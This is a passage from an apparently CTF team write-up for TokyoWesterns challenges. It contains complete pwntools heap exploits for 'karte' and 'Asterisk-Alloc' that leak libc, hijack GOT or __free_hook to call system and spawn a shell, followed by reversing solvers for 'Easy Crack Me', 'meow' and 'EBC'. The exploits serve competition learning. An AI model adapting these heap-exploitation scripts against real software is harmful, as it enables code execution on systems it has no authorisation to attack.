    p.sendline(<span class="hljs-string">'99'</span>)
    p.recvuntil(<span class="hljs-string">'name... '</span>)
    p.send(name)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GameStart</span><span class="hljs-params">(ip, port, debug)</span>:</span>
    <span class="hljs-keyword">global</span> p
    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:
        p = process(<span class="hljs-string">'./karte'</span>, env = {<span class="hljs-string">"LD_PRELOAD"</span> : <span class="hljs-string">'./libc.so.6'</span>})
    <span class="hljs-keyword">else</span>:
        p = remote(ip, port)
    p.recvuntil(<span class="hljs-string">'name... '</span>)
    p.send(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x80</span>))

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        idx = add(<span class="hljs-number">0x78</span>, <span class="hljs-string">'swing tql'</span>)
        delete(idx)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        idx = add(<span class="hljs-number">0x68</span>, <span class="hljs-string">'swing tql'</span>)
        delete(idx)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        idx = add(<span class="hljs-number">0x10</span>, <span class="hljs-string">'swing tql'</span>)
        delete(idx)

    idx1 = add(<span class="hljs-number">0x78</span>, <span class="hljs-string">'swing tql'</span>)
    idx2 = add(<span class="hljs-number">0x78</span>, <span class="hljs-string">'swing tql'</span>)
    delete(idx1)
    delete(idx2)
    modify(idx2, p64(<span class="hljs-number">0x6021A0</span>)[ : <span class="hljs-number">4</span>])
    idx1 = add(<span class="hljs-number">0x78</span>, <span class="hljs-string">'swing tql'</span>)


    idx2 = add(<span class="hljs-number">0x78</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>))
    rename(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>))
    idx3 = add(<span class="hljs-number">0x801</span>, <span class="hljs-string">'swing tql'</span>)
    delete(idx2)
    delete(idx3)

    rename(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x602118</span> - <span class="hljs-number">5</span> - <span class="hljs-number">0x10</span>))

    idx2 = add(<span class="hljs-number">0x10</span>, <span class="hljs-string">'swing tql'</span>)
    rename(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>))
    delete(idx2)
    rename(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x602110</span>))
    delete(idx1)

    idx1 = add(<span class="hljs-number">0x68</span>, <span class="hljs-string">'/bin/sh;'</span>)
    <span class="hljs-comment"># gdb.attach(p, 'b * 0x400B17\nc')</span>
    idx2 = add(<span class="hljs-number">0x68</span>, p64(<span class="hljs-number">0x0000000400000003</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x0000100000001</span>) + p64(<span class="hljs-number">0x602018</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0000200000001</span>) + p64(<span class="hljs-number">0x602068</span>) + p64(<span class="hljs-number">0x0000deadc0bebeef</span>))

    modify(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0x400760</span>)[ : <span class="hljs-number">6</span>])
    delete(<span class="hljs-number">2</span>)
    libc_base = u64(p.recvline()[ : <span class="hljs-number">-1</span>] + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span>) - <span class="hljs-number">0x97070</span>
    log.info(<span class="hljs-string">'libc base is : '</span> + hex(libc_base))
    system_addr = libc_base + <span class="hljs-number">0x4f440</span>

    modify(<span class="hljs-number">2</span>, p64(system_addr)[ : <span class="hljs-number">6</span>])

    p.recvuntil(<span class="hljs-string">'&gt; '</span>)
    p.sendline(<span class="hljs-string">'1'</span>)
    p.recvuntil(<span class="hljs-string">' &gt; '</span>)
    p.sendline(str(<span class="hljs-number">0x6021b0</span>))



    p.interactive()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    GameStart(<span class="hljs-string">'karte.chal.ctf.westerns.tokyo'</span>, <span class="hljs-number">10001</span>, <span class="hljs-number">0</span>)</code></pre><h3 id="asterisk-alloc"><a class="header-link" href="#asterisk-alloc"></a>Asterisk-Alloc</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

local=<span class="hljs-number">0</span>
remote_addr=[<span class="hljs-string">'ast-alloc.chal.ctf.westerns.tokyo'</span>,<span class="hljs-number">10001</span>]

libc=ELF(<span class="hljs-string">'./bytedance/libc-2.27.so'</span>)

p=remote(remote_addr[<span class="hljs-number">0</span>],remote_addr[<span class="hljs-number">1</span>])
<span class="hljs-comment">#context.log_level = True</span>

ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x)
sn = <span class="hljs-keyword">lambda</span> x : p.send(x)
rl = <span class="hljs-keyword">lambda</span>   : p.recvline()
sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)
rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)
sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)
sla = <span class="hljs-keyword">lambda</span> a,b : p.sendlineafter(a,b)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lg</span><span class="hljs-params">(s,addr = None)</span>:</span>
    <span class="hljs-keyword">if</span> addr:
        print(<span class="hljs-string">'\033[1;31;40m[+]  %-15s  --&gt; 0x%8x\033[0m'</span>%(s,addr))
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">'\033[1;32;40m[-]  %-20s \033[0m'</span>%(s))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raddr</span><span class="hljs-params">(a=<span class="hljs-number">6</span>)</span>:</span>
    <span class="hljs-keyword">if</span>(a==<span class="hljs-number">6</span>):
        <span class="hljs-keyword">return</span> u64(rv(a).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> u64(rl().strip(<span class="hljs-string">'\n'</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choice</span><span class="hljs-params">(idx)</span>:</span>
    <span class="hljs-comment">#ru("5. exit\n")</span>
    <span class="hljs-comment">#rl()</span>
    sla(<span class="hljs-string">": "</span>, str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span><span class="hljs-params">(size, content)</span>:</span>
    choice(<span class="hljs-number">1</span>)
    sla(<span class="hljs-string">": "</span>, str(size))
    sa(<span class="hljs-string">": "</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calloc</span><span class="hljs-params">(size, content)</span>:</span>
    choice(<span class="hljs-number">2</span>)
    sla(<span class="hljs-string">": "</span>, str(size))
    sa(<span class="hljs-string">": "</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">realloc</span><span class="hljs-params">(size, content)</span>:</span>
    choice(<span class="hljs-number">3</span>)
    sla(<span class="hljs-string">": "</span>, str(size))
    <span class="hljs-keyword">if</span>(size &gt; <span class="hljs-number">0</span>):
        sa(<span class="hljs-string">": "</span>, content)
    <span class="hljs-keyword">else</span>:
        ru(<span class="hljs-string">":"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rm</span><span class="hljs-params">(idx)</span>:</span>
    choice(<span class="hljs-number">4</span>)
    sla(<span class="hljs-string">": "</span>, idx)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size)</span>:</span>
    realloc(size, <span class="hljs-string">'AA'</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
        rm(<span class="hljs-string">'r'</span>)
    realloc(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    create(<span class="hljs-number">0x30</span>)
    create(<span class="hljs-number">0x20</span>)
    create(<span class="hljs-number">0x40</span>)
    create(<span class="hljs-number">0x60</span>)
    create(<span class="hljs-number">0x50</span>)
    realloc(<span class="hljs-number">0x70</span>, <span class="hljs-string">'AA'</span>)
    realloc(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    sla(<span class="hljs-string">": "</span>, <span class="hljs-string">'1'</span>*<span class="hljs-number">0x500</span>)
    <span class="hljs-comment">#realloc(0x90, p32(0xdd0760)[0:3])</span>
    <span class="hljs-comment">#realloc(0x28,p64(0))</span>
    <span class="hljs-comment">#realloc(0,'')</span>
    realloc(<span class="hljs-number">0x150</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x128</span> + p64(<span class="hljs-number">0xe1</span>)+p32(<span class="hljs-number">0x7758</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>])
    realloc(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    realloc(<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>))
    malloc(<span class="hljs-number">0x58</span>,<span class="hljs-string">'/bin/sh\x00'</span>+p64(<span class="hljs-number">0xfbad3c80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0</span>))
    rv(<span class="hljs-number">8</span>)
    libc_addr = u64(rv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x3ed8b0</span>
    lg(<span class="hljs-string">"libc"</span>,libc_addr)
    libc.address = libc_addr
    realloc(<span class="hljs-number">0x150</span>, <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x21</span>) + p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>])+p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">4</span>)
    realloc(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    realloc(<span class="hljs-number">0x70</span>,<span class="hljs-string">'\x00'</span>)
    realloc(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)
    realloc(<span class="hljs-number">0x70</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))
    rm(<span class="hljs-string">'m'</span>)
    sl(<span class="hljs-string">"cat flag"</span>)
    p.interactive()
</code></pre><h2 id="re"><a class="header-link" href="#re"></a>RE</h2>
<h3 id="easy-crack-me"><a class="header-link" href="#easy-crack-me"></a>Easy Crack Me</h3>
<p>Search for all possible strings and check them.</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span>
<span class="hljs-keyword">int</span> num[<span class="hljs-number">16</span>] = {<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>};
<span class="hljs-keyword">int</span> bsum[<span class="hljs-number">8</span>] = {<span class="hljs-number">0x15e</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x12f</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x102</span>};
<span class="hljs-keyword">int</span> bxor[<span class="hljs-number">8</span>] = {<span class="hljs-number">0x52</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>};
<span class="hljs-keyword">int</span> gsum[<span class="hljs-number">8</span>] = {<span class="hljs-number">0x129</span>, <span class="hljs-number">0x103</span>, <span class="hljs-number">0x12b</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x135</span>, <span class="hljs-number">0x10b</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>};
<span class="hljs-keyword">int</span> gxor[<span class="hljs-number">8</span>] = {<span class="hljs-number">0x1</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>};
<span class="hljs-keyword">char</span> a[<span class="hljs-number">33</span>] = <span class="hljs-string">"AfOAO87OAOOAAOOAO2AOAAOOO4AOOOA5"</span>;
<span class="hljs-keyword">int</span> esum = <span class="hljs-number">1160</span>;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">checkeven</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> (a[i] == <span class="hljs-string">'A'</span> || a[i] == <span class="hljs-string">'O'</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">else</span>
            sum += a[i];
    <span class="hljs-keyword">return</span> sum == esum;
}
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">checkbsum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">int</span> s = p / <span class="hljs-number">4</span> * <span class="hljs-number">4</span>;
    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = s; i &lt; s + <span class="hljs-number">4</span>; ++i)
        <span class="hljs-keyword">if</span> (a[i] == <span class="hljs-string">'A'</span> || a[i] == <span class="hljs-string">'O'</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">else</span>
            sum += a[i];
    <span class="hljs-keyword">return</span> sum == bsum[p / <span class="hljs-number">4</span>];
}
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">checkbxor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">int</span> s = p / <span class="hljs-number">4</span> * <span class="hljs-number">4</span>;
    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = s; i &lt; s + <span class="hljs-number">4</span>; ++i)
        <span class="hljs-keyword">if</span> (a[i] == <span class="hljs-string">'A'</span> || a[i] == <span class="hljs-string">'O'</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">else</span>
            sum ^= a[i];
    <span class="hljs-keyword">return</span> sum == bxor[p / <span class="hljs-number">4</span>];
}
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">checkgsum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">int</span> s = p % <span class="hljs-number">8</span>;
    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = s; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>)
        <span class="hljs-keyword">if</span> (a[i] == <span class="hljs-string">'A'</span> || a[i] == <span class="hljs-string">'O'</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">else</span>
            sum += a[i];
    <span class="hljs-keyword">return</span> sum == gsum[s];
}
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">checkgxor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">int</span> s = p % <span class="hljs-number">8</span>;
    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = s; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>)
        <span class="hljs-keyword">if</span> (a[i] == <span class="hljs-string">'A'</span> || a[i] == <span class="hljs-string">'O'</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">else</span>
            sum ^= a[i];
    <span class="hljs-keyword">return</span> sum == gxor[s];
}
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">if</span> (p % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> (!checkeven())
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (!checkbsum(p))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (!checkbxor(p))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (!checkgsum(p))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (!checkgxor(p))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p)</span>
</span>{
    <span class="hljs-keyword">if</span> (p == <span class="hljs-number">32</span>) {
        <span class="hljs-built_in">puts</span>(a);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (a[p] == <span class="hljs-string">'A'</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c = <span class="hljs-string">'a'</span>; c &lt;= <span class="hljs-string">'f'</span>; ++c)
            <span class="hljs-keyword">if</span> (num[c - <span class="hljs-string">'a'</span> + <span class="hljs-number">10</span>]) {
                --num[c - <span class="hljs-string">'a'</span> + <span class="hljs-number">10</span>];
                a[p] = c;
                <span class="hljs-keyword">if</span> (check(p))
                    dfs(p + <span class="hljs-number">1</span>);
                a[p] = <span class="hljs-string">'A'</span>;
                ++num[c - <span class="hljs-string">'a'</span> + <span class="hljs-number">10</span>];
            }
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a[p] == <span class="hljs-string">'O'</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c = <span class="hljs-string">'0'</span>; c &lt;= <span class="hljs-string">'9'</span>; ++c)
            <span class="hljs-keyword">if</span> (num[c - <span class="hljs-string">'0'</span>]) {
                --num[c - <span class="hljs-string">'0'</span>];
                a[p] = c;
                <span class="hljs-keyword">if</span> (check(p))
                    dfs(p + <span class="hljs-number">1</span>);
                a[p] = <span class="hljs-string">'O'</span>;
                ++num[c - <span class="hljs-string">'0'</span>];
            }
    }
    <span class="hljs-keyword">else</span>
        dfs(p + <span class="hljs-number">1</span>);
}
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i)
        <span class="hljs-keyword">if</span> (a[i] &gt;= <span class="hljs-string">'a'</span> &amp;&amp; a[i] &lt;= <span class="hljs-string">'z'</span>)
            --num[a[i] - <span class="hljs-string">'a'</span> + <span class="hljs-number">10</span>];
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a[i] &gt;= <span class="hljs-string">'0'</span> &amp;&amp; a[i] &lt;= <span class="hljs-string">'9'</span>)
            --num[a[i] - <span class="hljs-string">'0'</span>];
    dfs(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><h3 id="meow"><a class="header-link" href="#meow"></a>meow</h3>
<p>we can dump the bytecode by nekoc.exe
read it and find the pic is 768*768, and the program call read_pixel twice then write_pixel twice.
so test it by all (0,0,0)
find the pixel equation is <code>p[ i, j ] = p[ o[i], j ]  ^ t[ i, j ]</code>
so dump the t by all <code>(0,0,0)</code>
and dump the o by <code>p[i, j] = (0, i%256, i//256)</code>
we can decode it</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"t"</span>, <span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> f:
    t = f.read()
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"o"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
    o = f.readlines()

img = Image.open(<span class="hljs-string">"flag_enc.png"</span>)
p = img.load()
flag = Image.new(<span class="hljs-string">"RGBA"</span>, (<span class="hljs-number">768</span>, <span class="hljs-number">768</span>))
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">768</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">768</span>):
        tt = t[i*<span class="hljs-number">768</span>+j]
        oo = int(o[i])
        pp = p[i,j]
        flag.putpixel((oo,j), (pp[<span class="hljs-number">0</span>]^tt, pp[<span class="hljs-number">1</span>]^tt, pp[<span class="hljs-number">2</span>]^tt, <span class="hljs-number">255</span>))
flag.save(<span class="hljs-string">"flag.png"</span>)
</code></pre><h3 id="ebc"><a class="header-link" href="#ebc"></a>EBC</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> ida_bytes <span class="hljs-keyword">import</span> get_dword, patch_dword

code = <span class="hljs-number">0x401354</span>
magic = <span class="hljs-number">0x10028160</span>
<span class="hljs-comment">#ln, ptr = 0x2C0, 0x402114</span>
<span class="hljs-comment">#ln, ptr = 0x760, 0x4023DC</span>
<span class="hljs-comment">#ln, ptr = 0x830, 0x402B44</span>
ln, ptr = <span class="hljs-number">0x930</span>, <span class="hljs-number">0x40337C</span>
key = get_dword(ptr) ^ magic
print(<span class="hljs-string">'0x%08X'</span> % (key))
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, ln, <span class="hljs-number">4</span>):
    patch_dword(code + i, get_dword(ptr + i) ^ key)
</code></pre><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-keyword">uint64_t</span> ADD(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">uint64_t</span> SUB(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a - b;
}
<span class="hljs-keyword">uint64_t</span> XOR(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a ^ b;
}
<span class="hljs-keyword">uint64_t</span> OR(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a | b;
}
<span class="hljs-keyword">uint64_t</span> NOT(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> ~a;
}

<span class="hljs-keyword">uint64_t</span> NEG(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> - a;
}

<span class="hljs-keyword">uint64_t</span> SHL(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a &lt;&lt; b;
}

<span class="hljs-keyword">uint64_t</span> SHR(<span class="hljs-keyword">uint64_t</span> a, <span class="hljs-keyword">uint64_t</span> b)
{
    <span class="hljs-keyword">return</span> a &gt;&gt; b;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check1</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> R1)</span>
</span>{
    <span class="hljs-keyword">uint64_t</span> R2, R3, R4, R5, R6, R7;
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> R1 == R7;
}


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check2</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> R1)</span>
</span>{
    <span class="hljs-keyword">uint64_t</span> R2, R3, R4, R5, R6, R7;
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> R1 == R7;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check3</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> R1)</span>
</span>{
    <span class="hljs-keyword">uint64_t</span> R2, R3, R4, R5, R6, R7;
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> R1 == R7;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">check4</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> R1)</span>
</span>{
    <span class="hljs-keyword">uint64_t</span> R2, R3, R4, R5, R6, R7;
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> R1 == R7;
}

<span class="hljs-keyword">uint32_t</span> tbl[<span class="hljs-number">256</span>] = {
    <span class="hljs-comment">// crc 32</span>
};

<span class="hljs-keyword">char</span> chars[] = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">crack</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> a, <span class="hljs-keyword">uint8_t</span> b, <span class="hljs-keyword">uint8_t</span> c, <span class="hljs-keyword">uint8_t</span> d)</span>
</span>{
    <span class="hljs-keyword">uint8_t</span> arr[<span class="hljs-number">4</span>] = { a, b, c, d };
    <span class="hljs-keyword">uint32_t</span> v = <span class="hljs-number">0xFFFFFFFF</span>, k = <span class="hljs-number">0xC13FA3BB</span>; <span class="hljs-comment">// 0x43451B65 0x54AAF64B 0x52976ABD 0xC13FA3BB</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)
        v = (v &gt;&gt; <span class="hljs-number">8</span>) ^ tbl[(v &amp; <span class="hljs-number">0xFF</span>) ^ arr[i]];
    k ^= <span class="hljs-number">0xFFFFFFFF</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)
    {
        <span class="hljs-keyword">uint32_t</span> t = k &amp; <span class="hljs-number">0xFF000000</span>;
        <span class="hljs-keyword">int</span> x = <span class="hljs-number">-1</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x100</span>; j++)
            <span class="hljs-keyword">if</span> ((tbl[j] &amp; <span class="hljs-number">0xFF000000</span>) == t)
                x = j;
        arr[<span class="hljs-number">3</span> - i] = x;
        k = (k ^ tbl[x]) &lt;&lt; <span class="hljs-number">8</span>;
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)
    {
        <span class="hljs-keyword">uint8_t</span> t = (v &amp; <span class="hljs-number">0xFF</span>) ^ arr[i];
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(chars, t) == <span class="hljs-literal">NULL</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        v = (v &gt;&gt; <span class="hljs-number">8</span>) ^ tbl[arr[i]];
        arr[i] = t;
    }

    <span class="hljs-keyword">uint64_t</span> y = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">uint8_t</span> *p = (<span class="hljs-keyword">uint8_t</span>*)&amp;y;
    p[<span class="hljs-number">0</span>] = a;
    p[<span class="hljs-number">1</span>] = b;
    p[<span class="hljs-number">2</span>] = c;
    p[<span class="hljs-number">3</span>] = d;
    p[<span class="hljs-number">4</span>] = arr[<span class="hljs-number">0</span>];
    p[<span class="hljs-number">5</span>] = arr[<span class="hljs-number">1</span>];
